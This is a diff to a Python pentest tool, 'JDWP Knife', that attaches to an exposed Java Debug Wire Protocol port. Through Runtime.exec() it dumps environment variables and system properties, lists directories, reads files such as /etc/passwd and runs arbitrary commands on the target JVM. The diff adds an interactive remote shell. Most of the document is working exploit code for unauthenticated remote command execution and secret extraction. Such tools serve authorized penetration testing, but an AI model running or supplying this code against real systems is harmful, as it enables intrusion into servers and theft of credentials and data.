@@ -1,19 +1,19 @@
 #!/usr/bin/env python3
 
 """
-JDWP Swiss Knife — pentest tool for extracting data via JDWP protocol.
+JDWP Knife — pentest tool for extracting data from running JVMs via JDWP.
 
 All operations happen through Java method invocations over JDWP wire protocol.
 No shell needed, no outbound network, no file writes on target.
 
 Usage:
-    python3 jdwp-knife.py -t IP -p PORT --env
-    python3 jdwp-knife.py -t IP -p PORT --props
-    python3 jdwp-knife.py -t IP -p PORT --ls /app
-    python3 jdwp-knife.py -t IP -p PORT --cat /etc/passwd
-    python3 jdwp-knife.py -t IP -p PORT --cmd "id"
-    python3 jdwp-knife.py -t IP -p PORT --all
-    python3 jdwp-knife.py -t IP -p PORT --ls / --cat /etc/hosts --env
+    jdwp-knife -t IP -p PORT --env
+    jdwp-knife -t IP -p PORT --props
+    jdwp-knife -t IP -p PORT --ls /app
+    jdwp-knife -t IP -p PORT --cat /etc/passwd
+    jdwp-knife -t IP -p PORT --cmd "id"
+    jdwp-knife -t IP -p PORT --shell
+    jdwp-knife -t IP -p PORT --all
 """
 
 import socket
@@ -21,6 +21,13 @@ import sys
 import struct
 import argparse
 import traceback
+
+try:
+    import readline  # noqa: F401 — enables input() line editing
+except ImportError:
+    pass
+
+__version__ = "1.0.0"
 
 ################################################################################
 # JDWP protocol constants
@@ -60,6 +67,14 @@ TAG_LONG                = 74
 TYPE_CLASS              = 1
 
 
+class JDWPError(Exception):
+    """JDWP protocol-level error."""
+
+
+class JDWPConnectionError(JDWPError):
+    """Connection or handshake failure."""
+
+
 ################################################################################
 # JDWP Client
 ################################################################################
@@ -71,6 +86,7 @@ class JDWPClient:
         self.methods = {}
         self.id = 0x01
         self._class_cache = {}
+        self.socket = None
 
     # ── Low-level packet I/O ────────────────────────────────────────────────
 
@@ -86,7 +102,7 @@ class JDWPClient:
         header = self._recv_exact(11)
         pktlen, rid, flags, errcode = struct.unpack(">IIBH", header)
         if (flags & 0x80) and errcode:
-            raise Exception("JDWP error %d (0x%x)" % (errcode, errcode))
+            raise JDWPError("JDWP error %d (0x%x)" % (errcode, errcode))
         remaining = pktlen - 11
         return self._recv_exact(remaining) if remaining > 0 else b""
 
@@ -95,7 +111,7 @@ class JDWPClient:
         while len(buf) < n:
             chunk = self.socket.recv(min(4096, n - len(buf)))
             if not chunk:
-                raise Exception("Connection closed")
+                raise JDWPConnectionError("Connection closed by remote")
             buf += chunk
         return buf
 
@@ -104,14 +120,14 @@ class JDWPClient:
     def fmt(self, size, value):
         if size == 8: return struct.pack(">Q", value)
         elif size == 4: return struct.pack(">I", value)
-        else: raise Exception("Unsupported ID size: %d" % size)
+        else: raise JDWPError("Unsupported ID size: %d" % size)
 
     def unfmt(self, size, buf):
         if len(buf) < size:
-            raise Exception("unfmt: need %d bytes, got %d" % (size, len(buf)))
+            raise JDWPError("unfmt: need %d bytes, got %d" % (size, len(buf)))
         if size == 8: return struct.unpack(">Q", buf[:8])[0]
         elif size == 4: return struct.unpack(">I", buf[:4])[0]
-        else: raise Exception("Unsupported ID size: %d" % size)
+        else: raise JDWPError("Unsupported ID size: %d" % size)
 
     def read_tagged_value(self, buf, offset):
         """Read a tagged value from buffer at offset. Returns (value, new_offset, tag)."""
@@ -131,7 +147,6 @@ class JDWPClient:
         elif tag == TAG_LONG:
             return struct.unpack(">q", buf[offset:offset+8])[0], offset + 8, tag
         else:
-            # Unknown tag — try objectIDSize as fallback
             val = self.unfmt(self.objectIDSize, buf[offset:offset+self.objectIDSize])
             return val, offset + self.objectIDSize, tag
 
@@ -144,32 +159,38 @@ class JDWPClient:
         self.allclasses()
 
     def handshake(self):
-        s = socket.socket()
-        s.settimeout(10)
-        s.connect((self.host, self.port))
+        try:
+            s = socket.socket()
+            s.settimeout(10)
+            s.connect((self.host, self.port))
+        except socket.timeout:
+            raise JDWPConnectionError("Connection timed out to %s:%d" % (self.host, self.port))
+        except OSError as e:
+            raise JDWPConnectionError("Cannot connect to %s:%d — %s" % (self.host, self.port, e))
         s.send(HANDSHAKE)
-        if s.recv(14) != HANDSHAKE:
-            raise Exception("JDWP handshake failed")
+        resp = s.recv(14)
+        if resp != HANDSHAKE:
+            s.close()
+            raise JDWPConnectionError(
+                "JDWP handshake failed (got %r) — target may not be a JDWP service" % resp
+            )
         self.socket = s
 
     def leave(self):
-        try: self.socket.close()
-        except: pass
+        if self.socket:
+            try: self.socket.close()
+            except OSError: pass
 
     def getversion(self):
         self.socket.sendall(self.create_packet(VERSION_SIG))
         buf = self.read_reply()
         idx = 0
-        # description (string)
         l = struct.unpack(">I", buf[idx:idx+4])[0]; idx += 4
         self.description = buf[idx:idx+l].decode('utf-8', errors='replace'); idx += l
-        # jdwpMajor, jdwpMinor
         self.jdwpMajor = struct.unpack(">I", buf[idx:idx+4])[0]; idx += 4
         self.jdwpMinor = struct.unpack(">I", buf[idx:idx+4])[0]; idx += 4
-        # vmVersion (string)
         l = struct.unpack(">I", buf[idx:idx+4])[0]; idx += 4
         self.vmVersion = buf[idx:idx+l].decode('utf-8', errors='replace'); idx += l
-        # vmName (string)
         l = struct.unpack(">I", buf[idx:idx+4])[0]; idx += 4
         self.vmName = buf[idx:idx+l].decode('utf-8', errors='replace'); idx += l
 
@@ -251,7 +272,6 @@ class JDWPClient:
         data = self.fmt(self.objectIDSize, objId)
         self.socket.sendall(self.create_packet(OBJ_REFERENCETYPE_SIG, data=data))
         buf = self.read_reply()
-        # Response: refTypeTag(1) + typeID(referenceTypeIDSize)
         refTypeTag = buf[0]
         typeId = self.unfmt(self.referenceTypeIDSize, buf[1:1+self.referenceTypeIDSize])
         return typeId
@@ -335,10 +355,7 @@ class JDWPClient:
         return self.read_reply()
 
     def read_object_array(self, arrayId, length):
-        """Read an array of object references. Returns list of objectIds."""
         buf = self.array_getvalues(arrayId, 0, length)
-        # ArrayRegion format: tag(1) + length(4) + elements
-        # Each element for object arrays: tag(1) + objectId(objectIDSize)
         tag = buf[0]
         arrLen = struct.unpack(">I", buf[1:5])[0]
         offset = 5
@@ -351,7 +368,6 @@ class JDWPClient:
         return result
 
     def read_string_array(self, arrayId, length):
-        """Read an array of String references and resolve them. Returns list of strings."""
         objIds = self.read_object_array(arrayId, length)
         result = []
         for oid in objIds:
@@ -362,9 +378,7 @@ class JDWPClient:
         return result
 
     def read_byte_array(self, arrayId, length):
-        """Read a byte[] array. Returns bytes."""
         buf = self.array_getvalues(arrayId, 0, length)
-        # ArrayRegion for byte[]: tag(1=TAG_BYTE) + length(4) + raw bytes
         tag = buf[0]
         arrLen = struct.unpack(">I", buf[1:5])[0]
         return buf[5:5+arrLen]
@@ -406,7 +420,6 @@ class JDWPClient:
         return self.unfmt(self.referenceTypeIDSize, buf)
 
     def find_method_up(self, classId, name, sig=None):
-        """Find method walking up the class hierarchy. Returns (method, classId) or (None, None)."""
         cid = classId
         visited = set()
         while cid and cid not in visited:
@@ -419,58 +432,99 @@ class JDWPClient:
             cid = self.get_superclass(cid)
         return None, None
 
-    def exec_with_output(self, tId, command):
-        """Execute command via Runtime.exec() and capture stdout through JDWP invocations.
-        No NewInstance, no shell, no outbound network — pure JDWP invoke chain."""
+    def _get_runtime(self, tId):
+        """Get Runtime instance and class ID. Returns (rtId, rtCid)."""
+        rtCls = self.get_class("Ljava/lang/Runtime;")
+        if not rtCls: raise JDWPError("Runtime class not found")
+        rtCid = rtCls["refTypeId"]
+        self.get_methods(rtCid)
 
-        # Increase socket timeout for potentially slow commands
+        getRtMeth = self.find_method(rtCid, "getRuntime")
+        if not getRtMeth: raise JDWPError("getRuntime() not found")
+        buf = self.invokestatic(rtCid, tId, getRtMeth["methodId"])
+        rtId, _, _ = self.read_tagged_value(buf, 0)
+        return rtId, rtCid
+
+    def _read_stream_bytes(self, tId, streamId):
+        """Read all bytes from an InputStream via readAllBytes(). Returns string."""
+        isCid = self.get_obj_class(streamId)
+        rabMeth, rabCid = self.find_method_up(isCid, "readAllBytes")
+        if not rabMeth: raise JDWPError("readAllBytes() not found (need Java 9+)")
+        buf = self.invoke(streamId, tId, rabCid, rabMeth["methodId"])
+        baId, _, tag = self.read_tagged_value(buf, 0)
+
+        if not baId or tag == TAG_VOID:
+            return ""
+
+        arrLen = self.array_length(baId)
+        if arrLen == 0: return ""
+        raw = self.read_byte_array(baId, arrLen)
+        return raw.decode('utf-8', errors='replace')
+
+    def _read_process_output(self, tId, procId):
+        """Read stdout and stderr from a Process object. Returns (stdout, stderr)."""
+        procCid = self.get_obj_class(procId)
+
+        # stdout
+        gisMeth, gisCid = self.find_method_up(procCid, "getInputStream")
+        if not gisMeth: raise JDWPError("getInputStream() not found")
+        buf = self.invoke(procId, tId, gisCid, gisMeth["methodId"])
+        isId, _, _ = self.read_tagged_value(buf, 0)
+        if not isId: raise JDWPError("getInputStream() returned null")
+        stdout = self._read_stream_bytes(tId, isId)
+
+        # stderr
+        stderr = ""
+        try:
+            gesMeth, gesCid = self.find_method_up(procCid, "getErrorStream")
+            if gesMeth:
+                buf = self.invoke(procId, tId, gesCid, gesMeth["methodId"])
+                esId, _, _ = self.read_tagged_value(buf, 0)
+                if esId:
+                    stderr = self._read_stream_bytes(tId, esId)
+        except Exception:
+            pass
+
+        return stdout, stderr
+
+    def exec_with_output(self, tId, command, cwd=None):
+        """Execute command via Runtime.exec() and capture stdout through JDWP.
+        If cwd is given, uses exec(String, String[], File) to set working directory."""
         old_timeout = self.socket.gettimeout()
         self.socket.settimeout(30)
 
         try:
-            # 1. Runtime.getRuntime()
-            rtCls = self.get_class("Ljava/lang/Runtime;")
-            if not rtCls: raise Exception("Runtime class not found")
-            rtCid = rtCls["refTypeId"]
-            self.get_methods(rtCid)
-
-            getRtMeth = self.find_method(rtCid, "getRuntime")
-            if not getRtMeth: raise Exception("getRuntime() not found")
-            buf = self.invokestatic(rtCid, tId, getRtMeth["methodId"])
-            rtId, _, _ = self.read_tagged_value(buf, 0)
-
-            # 2. runtime.exec(command) → Process
-            execMeth = self.find_method(rtCid, "exec", "(Ljava/lang/String;)Ljava/lang/Process;")
-            if not execMeth: raise Exception("exec(String) not found")
+            rtId, rtCid = self._get_runtime(tId)
             cmdArg, _ = self.make_string_arg(command)
-            buf = self.invoke(rtId, tId, rtCid, execMeth["methodId"], cmdArg)
+
+            if cwd:
+                # Use exec(String cmd, String[] envp, File dir)
+                execMeth = self.find_method(
+                    rtCid, "exec",
+                    "(Ljava/lang/String;[Ljava/lang/String;Ljava/io/File;)Ljava/lang/Process;"
+                )
+                if not execMeth:
+                    raise JDWPError("exec(String,String[],File) not found")
+
+                dirObj, _ = self.create_file_object(tId, cwd)
+                nullArg = bytes([TAG_OBJECT]) + self.fmt(self.objectIDSize, 0)
+                dirArg = bytes([TAG_OBJECT]) + self.fmt(self.objectIDSize, dirObj)
+                buf = self.invoke(rtId, tId, rtCid, execMeth["methodId"],
+                                  cmdArg, nullArg, dirArg)
+            else:
+                execMeth = self.find_method(
+                    rtCid, "exec", "(Ljava/lang/String;)Ljava/lang/Process;"
+                )
+                if not execMeth: raise JDWPError("exec(String) not found")
+                buf = self.invoke(rtId, tId, rtCid, execMeth["methodId"], cmdArg)
+
             procId, _, _ = self.read_tagged_value(buf, 0)
-            if not procId: raise Exception("exec() returned null")
+            if not procId: raise JDWPError("exec() returned null")
 
-            # 3. process.getInputStream() → InputStream
-            procCid = self.get_obj_class(procId)
-            gisMeth, gisCid = self.find_method_up(procCid, "getInputStream")
-            if not gisMeth: raise Exception("getInputStream() not found")
-            buf = self.invoke(procId, tId, gisCid, gisMeth["methodId"])
-            isId, _, _ = self.read_tagged_value(buf, 0)
-            if not isId: raise Exception("getInputStream() returned null")
-
-            # 4. inputStream.readAllBytes() → byte[]
-            #    (blocks until process exits, Java 9+)
-            isCid = self.get_obj_class(isId)
-            rabMeth, rabCid = self.find_method_up(isCid, "readAllBytes")
-            if not rabMeth: raise Exception("readAllBytes() not found (need Java 9+)")
-            buf = self.invoke(isId, tId, rabCid, rabMeth["methodId"])
-            baId, _, tag = self.read_tagged_value(buf, 0)
-
-            if not baId or tag == TAG_VOID:
-                return ""
-
-            # 5. Read byte[] via JDWP ArrayReference.GetValues
-            arrLen = self.array_length(baId)
-            if arrLen == 0: return ""
-            raw = self.read_byte_array(baId, arrLen)
-            return raw.decode('utf-8', errors='replace')
+            stdout, stderr = self._read_process_output(tId, procId)
+            if stderr:
+                return stdout + stderr
+            return stdout
 
         finally:
             self.socket.settimeout(old_timeout)
@@ -493,41 +547,36 @@ class JDWPClient:
             self.get_methods(classId)
         m = self.find_method(classId, methodName, sig)
         if not m:
-            raise Exception("Method '%s' not found on class %x" % (methodName, classId))
+            raise JDWPError("Method '%s' not found on class %x" % (methodName, classId))
         buf = self.invoke(objId, threadId, classId, m["methodId"], *args)
         val, _, tag = self.read_tagged_value(buf, 0)
         return val
 
     def create_file_object(self, threadId, path):
         fileCls = self.get_class("Ljava/io/File;")
-        if not fileCls: raise Exception("java.io.File not found")
+        if not fileCls: raise JDWPError("java.io.File not found")
         fid = fileCls["refTypeId"]
         self.get_methods(fid)
         ctor = self.find_method(fid, "<init>", "(Ljava/lang/String;)V")
-        if not ctor: raise Exception("File(String) constructor not found")
+        if not ctor: raise JDWPError("File(String) constructor not found")
         pathArg, _ = self.make_string_arg(path)
         buf = self.newinstance(fid, threadId, ctor["methodId"], pathArg)
 
-        # NewInstance response varies by JVM:
-        # Standard: tag(1) + objectId(N) + excTag(1) + excId(N) = 2*(1+N) bytes
-        # Some JVMs: objectId(N) only = N bytes
         expected_full = 2 * (1 + self.objectIDSize)
 
         if len(buf) >= expected_full:
-            # Standard tagged format
             objId, offset, tag = self.read_tagged_value(buf, 0)
             excId, _, _ = self.read_tagged_value(buf, offset)
             if excId != 0:
                 excMsg = self.call_tostring(excId, threadId)
-                raise Exception("File() threw: %s" % excMsg)
+                raise JDWPError("File() threw: %s" % excMsg)
         elif len(buf) >= self.objectIDSize:
-            # Untagged format — just objectId
             objId = self.unfmt(self.objectIDSize, buf[0:self.objectIDSize])
         else:
-            raise Exception("NewInstance: unexpected response (%d bytes)" % len(buf))
+            raise JDWPError("NewInstance: unexpected response (%d bytes)" % len(buf))
 
         if objId == 0:
-            raise Exception("NewInstance returned null")
+            raise JDWPError("NewInstance returned null")
 
         return objId, fid
 
@@ -537,16 +586,18 @@ class JDWPClient:
 ################################################################################
 def str2fqclass(s):
     i = s.rfind('.')
-    if i == -1: sys.exit("Cannot parse method path: %s" % s)
+    if i == -1:
+        raise ValueError("Cannot parse method path: %s (expected pkg.Class.method)" % s)
     return 'L' + s[:i].replace('.', '/') + ';', s[i+1:]
+
 
 def setup_breakpoint(jdwp, break_on):
     classname, method = str2fqclass(break_on)
     c = jdwp.get_class(classname)
-    if not c: raise Exception("Class %s not found" % classname)
+    if not c: raise JDWPError("Class %s not found" % classname)
     jdwp.get_methods(c["refTypeId"])
     m = jdwp.find_method(c["refTypeId"], method)
-    if not m: raise Exception("Method %s not found" % method)
+    if not m: raise JDWPError("Method %s not found" % method)
 
     loc = bytes([TYPE_CLASS])
     loc += jdwp.fmt(jdwp.referenceTypeIDSize, c["refTypeId"])
@@ -569,7 +620,7 @@ def setup_breakpoint(jdwp, break_on):
 
 
 ################################################################################
-# --env : System.getenv() via toString() fallback-first (most reliable)
+# --env : System.getenv()
 ################################################################################
 def do_env(jdwp, tId):
     print("\n" + "="*70)
@@ -589,7 +640,6 @@ def do_env(jdwp, tId):
     if mapId == 0: return print("[-] getenv() returned null")
     print("[+] Got env Map (id:%#x)" % mapId)
 
-    # Approach 1: try entrySet().toArray() + individual toString()
     try:
         setId = jdwp.invoke_and_get_obj(mapId, tId, "entrySet")
         arrayId = jdwp.invoke_and_get_obj(setId, tId, "toArray", "()[Ljava/lang/Object;")
@@ -613,10 +663,8 @@ def do_env(jdwp, tId):
         print("[!] entrySet path failed: %s" % e)
         print("[!] Falling back to Map.toString()...\n")
 
-    # Approach 2: map.toString() — returns {KEY=val, KEY2=val2, ...}
     try:
         val = jdwp.call_tostring(mapId, tId)
-        # Parse {K=V, K2=V2, ...}
         if val.startswith("{") and val.endswith("}"):
             inner = val[1:-1]
             for pair in inner.split(", "):
@@ -671,13 +719,13 @@ def do_props(jdwp, tId):
                 res = jdwp.solve_string(val)
                 results[prop] = res
                 print("  %-45s = %s" % (prop, res))
-        except:
+        except Exception:
             pass
     return results
 
 
 ################################################################################
-# --ls PATH : via Runtime.exec("ls -1a") + stdout capture through JDWP
+# --ls PATH
 ################################################################################
 def do_ls(jdwp, tId, path):
     print("\n" + "="*70)
@@ -697,7 +745,7 @@ def do_ls(jdwp, tId, path):
 
 
 ################################################################################
-# --cat FILE : via Runtime.exec("cat") + stdout capture through JDWP
+# --cat FILE
 ################################################################################
 def do_cat(jdwp, tId, path):
     print("\n" + "="*70)
@@ -708,13 +756,12 @@ def do_cat(jdwp, tId, path):
     if not output:
         print("[-] Empty output (file not found or access denied)")
         return
-
     print(output)
     return output
 
 
 ################################################################################
-# --cmd : Runtime.exec() (fire-and-forget)
+# --cmd
 ################################################################################
 def do_cmd(jdwp, tId, command):
     print("\n" + "="*70)
@@ -758,46 +805,276 @@ def do_all(jdwp, tId):
 
 
 ################################################################################
+# --shell : pseudo-interactive TTY shell
+################################################################################
+def _resolve_prompt_info(jdwp, tId):
+    """Try to resolve user.name, hostname, and user.dir from the target JVM."""
+    username = "jdwp"
+    hostname = "target"
+    cwd = "/"
+
+    sysCls = jdwp.get_class("Ljava/lang/System;")
+    if not sysCls:
+        return username, hostname, cwd
+
+    sid = sysCls["refTypeId"]
+    jdwp.get_methods(sid)
+    m = jdwp.find_method(sid, "getProperty", "(Ljava/lang/String;)Ljava/lang/String;")
+    if not m:
+        return username, hostname, cwd
+
+    for prop, target in [("user.name", "username"), ("user.dir", "cwd")]:
+        try:
+            arg, _ = jdwp.make_string_arg(prop)
+            buf = jdwp.invokestatic(sid, tId, m["methodId"], arg)
+            val, _, tag = jdwp.read_tagged_value(buf, 0)
+            if tag == TAG_STRING and val != 0:
+                resolved = jdwp.solve_string(val)
+                if resolved:
+                    if target == "username":
+                        username = resolved
+                    elif target == "cwd":
+                        cwd = resolved
+        except Exception:
+            pass
+
+    try:
+        out = jdwp.exec_with_output(tId, "hostname")
+        if out and out.strip():
+            hostname = out.strip()
+    except Exception:
+        pass
+
+    return username, hostname, cwd
+
+
+def _resolve_path(cwd, target):
+    """Resolve a path relative to cwd on the target (POSIX). Returns absolute path."""
+    if target.startswith("/"):
+        parts = target.split("/")
+    else:
+        parts = (cwd + "/" + target).split("/")
+
+    resolved = []
+    for p in parts:
+        if p == "" or p == ".":
+            continue
+        elif p == "..":
+            if resolved:
+                resolved.pop()
+        else:
+            resolved.append(p)
+    return "/" + "/".join(resolved)
+
+
+def _check_directory(jdwp, tId, path):
+    """Check if path is a directory using java.io.File.isDirectory() via JDWP."""
+    try:
+        fileObj, fileCid = jdwp.create_file_object(tId, path)
+        jdwp.get_methods(fileCid)
+        m = jdwp.find_method(fileCid, "isDirectory", "()Z")
+        if not m:
+            return False
+        buf = jdwp.invoke(fileObj, tId, fileCid, m["methodId"])
+        val, _, tag = jdwp.read_tagged_value(buf, 0)
+        return val == 1
+    except Exception:
+        return False
+
+
+def _get_canonical_path(jdwp, tId, path):
+    """Resolve symlinks and normalize path using File.getCanonicalPath() via JDWP."""
+    try:
+        fileObj, fileCid = jdwp.create_file_object(tId, path)
+        jdwp.get_methods(fileCid)
+        m = jdwp.find_method(fileCid, "getCanonicalPath", "()Ljava/lang/String;")
+        if not m:
+            return path
+        buf = jdwp.invoke(fileObj, tId, fileCid, m["methodId"])
+        val, _, tag = jdwp.read_tagged_value(buf, 0)
+        if tag == TAG_STRING and val != 0:
+            return jdwp.solve_string(val)
+    except Exception:
+        pass
+    return path
+
+
+def _shell_handle_cd(jdwp, tId, args, cwd):
+    """Handle 'cd' command. Returns new cwd or current cwd on failure."""
+    if not args:
+        # cd with no args — try user.home
+        try:
+            sysCls = jdwp.get_class("Ljava/lang/System;")
+            if sysCls:
+                sid = sysCls["refTypeId"]
+                jdwp.get_methods(sid)
+                m = jdwp.find_method(sid, "getProperty",
+                                     "(Ljava/lang/String;)Ljava/lang/String;")
+                if m:
+                    arg, _ = jdwp.make_string_arg("user.home")
+                    buf = jdwp.invokestatic(sid, tId, m["methodId"], arg)
+                    val, _, tag = jdwp.read_tagged_value(buf, 0)
+                    if tag == TAG_STRING and val != 0:
+                        home = jdwp.solve_string(val)
+                        if home and _check_directory(jdwp, tId, home):
+                            return home
+        except Exception:
+            pass
+        return cwd
+
+    target = args[0]
+    if target == "-":
+        print("-bash: cd: OLDPWD not set")
+        return cwd
+
+    new_path = _resolve_path(cwd, target)
+
+    # Verify directory exists via File.isDirectory() — pure JDWP, no shell needed
+    if _check_directory(jdwp, tId, new_path):
+        # Resolve symlinks and canonicalize
+        return _get_canonical_path(jdwp, tId, new_path)
+
+    print("-bash: cd: %s: No such file or directory" % target)
+    return cwd
+
+
+def do_shell(jdwp, tId):
+    """Pseudo-interactive shell over JDWP with cd/pwd support."""
+    username, hostname, cwd = _resolve_prompt_info(jdwp, tId)
+
+    print("\n[*] JDWP pseudo-shell on %s@%s" % (username, hostname))
+    print("[*] Commands execute via Runtime.exec() on the target JVM")
+    print("[*] Builtins: cd, pwd, exit. No pipes or redirects.")
+    print("[*] Type 'exit' or press Ctrl-D to return\n")
+
+    def make_prompt():
+        display_cwd = cwd
+        # Shorten home dir to ~ if we know it
+        return "\033[1;31m%s@%s\033[0m:\033[1;34m%s\033[0m$ " % (
+            username, hostname, display_cwd)
+
+    while True:
+        try:
+            line = input(make_prompt())
+        except (EOFError, KeyboardInterrupt):
+            print()
+            break
+
+        line = line.strip()
+        if not line:
+            continue
+        if line in ("exit", "quit"):
+            break
+
+        # Parse command
+        parts = line.split()
+        cmd = parts[0]
+        cmd_args = parts[1:]
+
+        # Builtin: cd
+        if cmd == "cd":
+            cwd = _shell_handle_cd(jdwp, tId, cmd_args, cwd)
+            continue
+
+        # Builtin: pwd
+        if cmd == "pwd":
+            print(cwd)
+            continue
+
+        try:
+            output = jdwp.exec_with_output(tId, line, cwd)
+            if output:
+                sys.stdout.write(output)
+                if not output.endswith('\n'):
+                    sys.stdout.write('\n')
+        except JDWPConnectionError:
+            print("[-] Connection lost")
+            break
+        except JDWPError as e:
+            print("[-] JDWP error: %s" % e)
+        except Exception as e:
+            print("[-] Error: %s" % e)
+
+    print("[*] Shell closed, returning...")
+
+
+################################################################################
+# Output tee
+################################################################################
+class Tee:
+    def __init__(self, *streams):
+        self.streams = streams
+
+    def write(self, data):
+        for s in self.streams:
+            s.write(data)
+            s.flush()
+
+    def flush(self):
+        for s in self.streams:
+            s.flush()
+
+
+################################################################################
 # Main
 ################################################################################
-if __name__ == "__main__":
+def build_parser():
     parser = argparse.ArgumentParser(
-        description="JDWP Swiss Knife",
+        prog="jdwp-knife",
+        description="JDWP Knife — extract data from JVMs via JDWP protocol",
         formatter_class=argparse.RawDescriptionHelpFormatter,
-        epilog="""
-Examples:
+        epilog="""\
+examples:
   %(prog)s -t TARGET -p 5005 --env
   %(prog)s -t TARGET -p 5005 --props
   %(prog)s -t TARGET -p 5005 --ls /app --ls /tmp
   %(prog)s -t TARGET -p 5005 --cat /etc/passwd
+  %(prog)s -t TARGET -p 5005 --cmd "id"
+  %(prog)s -t TARGET -p 5005 --shell
   %(prog)s -t TARGET -p 5005 --all -o dump.txt
 """)
-    parser.add_argument("-t", "--target", required=True)
-    parser.add_argument("-p", "--port", type=int, default=5005)
-    parser.add_argument("--break-on", default="java.lang.Thread.sleep")
-    parser.add_argument("--env", action="store_true", help="Dump env vars")
-    parser.add_argument("--props", action="store_true", help="Dump system properties")
-    parser.add_argument("--ls", action="append", metavar="PATH", help="List directory")
-    parser.add_argument("--cat", action="append", metavar="FILE", help="Read file")
-    parser.add_argument("--cmd", type=str, help="Execute command")
-    parser.add_argument("--all", action="store_true", help="Full enumeration")
-    parser.add_argument("-o", "--output", type=str, help="Save output to file")
+    parser.add_argument("-v", "--version", action="version",
+                        version="%(prog)s " + __version__)
+    parser.add_argument("-t", "--target", required=True,
+                        help="Target host")
+    parser.add_argument("-p", "--port", type=int, default=5005,
+                        help="JDWP port (default: 5005)")
+    parser.add_argument("--break-on", default="java.lang.Thread.sleep",
+                        help="Breakpoint target (default: java.lang.Thread.sleep)")
+    parser.add_argument("--env", action="store_true",
+                        help="Dump environment variables")
+    parser.add_argument("--props", action="store_true",
+                        help="Dump JVM system properties")
+    parser.add_argument("--ls", action="append", metavar="PATH",
+                        help="List directory (repeatable)")
+    parser.add_argument("--cat", action="append", metavar="FILE",
+                        help="Read file contents (repeatable)")
+    parser.add_argument("--cmd", type=str,
+                        help="Execute command via Runtime.exec()")
+    parser.add_argument("--shell", action="store_true",
+                        help="Pseudo-interactive TTY shell")
+    parser.add_argument("--all", action="store_true",
+                        help="Full enumeration (props + env + key dirs/files)")
+    parser.add_argument("-o", "--output", type=str,
+                        help="Save output to file")
+    return parser
 
+
+def main():
+    parser = build_parser()
     args = parser.parse_args()
 
-    if not any([args.env, args.props, args.ls, args.cat, args.cmd, args.all]):
+    if not any([args.env, args.props, args.ls, args.cat, args.cmd, args.all, args.shell]):
         args.props = True
 
+    logfile = None
     if args.output:
-        class Tee:
-            def __init__(self, *streams):
-                self.streams = streams
-            def write(self, data):
-                for s in self.streams: s.write(data); s.flush()
-            def flush(self):
-                for s in self.streams: s.flush()
-        logfile = open(args.output, 'w')
-        sys.stdout = Tee(sys.__stdout__, logfile)
+        try:
+            logfile = open(args.output, 'w')
+            sys.stdout = Tee(sys.__stdout__, logfile)
+        except OSError as e:
+            print("[-] Cannot open output file: %s" % e, file=sys.stderr)
+            return 1
 
     cli = None
     retcode = 0
@@ -810,7 +1087,9 @@ Examples:
 
         tId = setup_breakpoint(cli, args.break_on)
 
-        if args.all:
+        if args.shell:
+            do_shell(cli, tId)
+        elif args.all:
             do_all(cli, tId)
         else:
             if args.props: do_props(cli, tId)
@@ -830,15 +1109,27 @@ Examples:
 
     except KeyboardInterrupt:
         print("\n[!] Interrupted")
+    except JDWPConnectionError as e:
+        print("[-] Connection error: %s" % e, file=sys.stderr)
+        retcode = 1
+    except JDWPError as e:
+        print("[-] JDWP error: %s" % e, file=sys.stderr)
+        retcode = 1
     except Exception as e:
-        print("[-] Exception: %s" % e)
+        print("[-] Fatal: %s" % e, file=sys.stderr)
         traceback.print_exc()
         retcode = 1
     finally:
         if cli:
             try: cli.resumevm()
-            except: pass
+            except Exception: pass
             cli.leave()
-        if args.output: logfile.close()
+        if logfile:
+            try: logfile.close()
+            except Exception: pass
 
-    sys.exit(retcode)
+    return retcode
+
+
+if __name__ == "__main__":
+    sys.exit(main())
